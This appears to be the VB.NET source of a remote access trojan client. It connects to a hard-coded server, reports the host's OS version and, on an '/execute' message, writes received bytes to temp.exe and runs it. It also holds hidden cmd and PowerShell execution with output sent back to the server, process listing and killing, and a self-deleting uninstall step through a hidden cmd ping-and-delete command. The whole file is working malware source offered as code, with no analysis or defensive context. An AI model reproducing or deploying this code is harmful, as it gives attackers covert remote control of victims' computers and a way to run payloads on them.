Imports System.Net.Sockets
Imports System.Text
Imports System.Threading
Imports System.Diagnostics
Imports System.IO

Module ClientModule
    Private client As TcpClient
    Private stream As NetworkStream
    Private clientRunning As Boolean = True
    Private ReadOnly serverIP As String = "127.0.0.1"
    Private ReadOnly serverPort As Integer = 56560
    Private ReadOnly retryInterval As Integer = 5000 '10s
    Private osInfoSent As Boolean = False
    Sub Main()
        Console.WriteLine("Client started")
        While True
            Try
                ConnectToServer()
                Dim receiveThread As New Thread(AddressOf ReceiveMessages)
                receiveThread.Start()

                If Not osInfoSent Then
                    SendOperatingSystemInfo()
                    osInfoSent = True
                End If

                While clientRunning
                    Dim message As String = Console.ReadLine()
                    If message.ToLower() = "exit" Then
                        clientRunning = False
                        client.Close()
                    Else
                        SendMessage(message)
                    End If
                End While
            Catch ex As Exception
                Console.WriteLine($"Disconnected from server. Attempting to reconnect...")
                osInfoSent = False
                Thread.Sleep(retryInterval)
            End Try
        End While
    End Sub



    Private Sub ConnectToServer()
        While True
            Try
                client = New TcpClient(serverIP, serverPort)
                stream = client.GetStream()
                Console.WriteLine("Connected to server.")
                If Not osInfoSent Then
                    SendOperatingSystemInfo()
                    osInfoSent = True
                End If
                Exit While
            Catch ex As Exception
                Console.WriteLine($"Failed to connect to server. Retrying..")
                osInfoSent = False
                Thread.Sleep(retryInterval)
            End Try
        End While
    End Sub

    Private Sub ReceiveMessages()
        Dim buffer(1024) As Byte

        While clientRunning
            Try
                Dim bytesRead As Integer = stream.Read(buffer, 0, buffer.Length)
                If bytesRead > 0 Then
                    Dim message As String = Encoding.ASCII.GetString(buffer, 0, bytesRead)
                    If message.StartsWith("/execute") Then
                        ExecuteFile(message)
                    Else
                        Console.WriteLine("Server: " & message)
                    End If
                End If
            Catch ex As Exception
                Console.WriteLine("Disconnected from server. Attempting to reconnect...")
                osInfoSent = False
                ConnectToServer() 'reconnect
            End Try
        End While
    End Sub
    Private Sub ExecuteFile(command As String)
        Dim commandParts As String() = command.Split(" "c, 2)
        If commandParts.Length > 1 Then
            Dim fileName As String = "temp.exe"
            Dim filePath As String = Path.Combine(Environment.CurrentDirectory, fileName)
            File.WriteAllBytes(filePath, Encoding.ASCII.GetBytes(commandParts(1)))
            Dim processInfo As New ProcessStartInfo(filePath)
            processInfo.UseShellExecute = True
            Process.Start(processInfo)
        Else
            Console.WriteLine("Usage: /execute {bytes}")
        End If
    End Sub


    Private Sub SendOperatingSystemInfo()
        Dim osInfo As String = Environment.OSVersion.ToString()
        Dim buffer() As Byte = Encoding.ASCII.GetBytes(osInfo)
        stream.Write(buffer, 0, buffer.Length)
    End Sub

    Private Sub SendMessage(message As String)
        Dim buffer() As Byte = Encoding.ASCII.GetBytes(message)
        stream.Write(buffer, 0, buffer.Length)
    End Sub




    Private Sub ProcessCommand(command As String)
        Dim commandParts As String() = command.Split(" "c, 2)
        Select Case commandParts(0).ToLower()
            Case "/shell"
                If commandParts.Length > 1 Then
                    RunShellCommand(commandParts(1))
                Else
                    SendMessage("Usage: /shell {command}")
                End If
            Case "/ps"
                If commandParts.Length > 1 Then
                    RunPowerShellCommand(commandParts(1))
                Else
                    SendMessage("Usage: /ps {command}")
                End If
            Case "/listproc"
                ListProcesses()
            Case "/killproc"
                If commandParts.Length > 1 Then
                    KillProcess(commandParts(1))
                Else
                    SendMessage("Usage: /killproc {pid}")
                End If

            Case "/close"
                clientRunning = False
                Environment.ExitCode = 0
                Environment.Exit(0)
            Case "/uninstall"
                UninstallClient()


            Case Else

        End Select
    End Sub


    Private Sub UninstallClient()
        Try
            Dim exePath As String = System.Reflection.Assembly.GetExecutingAssembly().Location
            Dim psi As New ProcessStartInfo("cmd.exe")
            psi.Arguments = $"/c ping 1.1.1.1 -n 1 -w 3000 > Nul & Del ""{exePath}"" & exit"
            psi.WindowStyle = ProcessWindowStyle.Hidden
            Process.Start(psi)
            clientRunning = False
            Environment.ExitCode = 0
            Environment.Exit(0)
        Catch ex As Exception
            SendMessage("Error uninstalling client: " & ex.Message)
        End Try
    End Sub

    Private Sub RunShellCommand(shellCommand As String)
        Try
            Dim procStartInfo As New ProcessStartInfo("cmd", "/c " & shellCommand)
            procStartInfo.RedirectStandardOutput = True
            procStartInfo.UseShellExecute = False
            procStartInfo.CreateNoWindow = True

            Dim proc As New Process()
            proc.StartInfo = procStartInfo
            proc.Start()

            Dim result As String = proc.StandardOutput.ReadToEnd()
            SendMessage(result)
        Catch ex As Exception
            SendMessage("Error running shell command: " & ex.Message)
        End Try
    End Sub
    Private Sub RunPowerShellCommand(psCommand As String)
        Try
            Dim procStartInfo As New ProcessStartInfo("powershell", "-Command " & psCommand)
            procStartInfo.RedirectStandardOutput = True
            procStartInfo.RedirectStandardError = True
            procStartInfo.UseShellExecute = False
            procStartInfo.CreateNoWindow = True

            Dim proc As New Process()
            proc.StartInfo = procStartInfo
            proc.Start()

            Dim result As String = proc.StandardOutput.ReadToEnd()
            Dim errorMsg As String = proc.StandardError.ReadToEnd()
            If String.IsNullOrEmpty(result) AndAlso Not String.IsNullOrEmpty(errorMsg) Then
                result = errorMsg
            End If
            SendMessage(result)
        Catch ex As Exception
            SendMessage("Error running PowerShell command: " & ex.Message)
        End Try
    End Sub


    Private Sub ListProcesses()
        Dim processes = Process.GetProcesses()
        Dim sb As New StringBuilder()
        For Each proc In processes
            sb.AppendLine($"{proc.Id}: {proc.ProcessName}")
        Next
        SendMessage(sb.ToString())
    End Sub

    Private Sub KillProcess(pid As String)
        Try
            Dim proc = Process.GetProcessById(Integer.Parse(pid))
            proc.Kill()
            SendMessage($"Process {pid} killed.")
        Catch ex As Exception
            SendMessage($"Error killing process {pid}: " & ex.Message)
        End Try
    End Sub




End Module
